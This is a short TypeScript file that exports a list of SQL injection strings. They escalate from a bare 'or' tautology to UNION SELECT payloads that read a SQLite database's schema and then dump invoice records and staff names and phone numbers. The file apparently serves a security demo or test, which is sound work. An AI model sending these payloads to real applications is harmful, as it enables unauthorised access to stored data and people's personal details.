const examples: string[] = [
  "or",
  "union select type, tbl_name, sql from sqlite_master where",
  "union select type, tbl_name, sql from sqlite_master where 1 union select id, total, staff_id from invoice where",
  "union select type, tbl_name, sql from sqlite_master where 1 union select id, total, staff_id from invoice where 1 union select id, name, phone from staff where",
];

export const injectionExamples = examples.map(
  (example) => `' ${example} '%'='`
);
